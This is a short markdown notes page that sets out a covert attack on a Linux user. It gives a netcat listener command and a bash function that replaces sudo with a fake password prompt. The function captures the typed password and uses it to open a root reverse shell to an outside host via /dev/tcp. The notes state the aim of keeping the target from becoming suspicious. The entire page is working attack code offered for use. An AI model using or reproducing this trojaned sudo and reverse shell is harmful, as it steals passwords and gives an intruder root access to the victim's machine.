## Give 'em the ol' switcheroo

##### Listen for incoming connections on the server
`nc -l 0.0.0.0 8837 -vv`

##### Make a function called sudo, so when the target uses sudo, they are less likely to become suspicious

###### Note: Change 3141.thx.dog with a domain pointing to the server that's listening, and 8837 if you changed the port netcat listens on
`sudo() { /bin/echo [sudo] password for $USER: ; read -s chwing; echo "$chwing" | /usr/bin/sudo -S <<< "$chwing" "$0" "-lic" "exec 5<>/dev/tcp/3141.thx.dog/8837; cat <&5 | while read _R; do \$_R 2>&5 >&5; done &"; }`


###### These are just random notes for things im working on work-in-progress
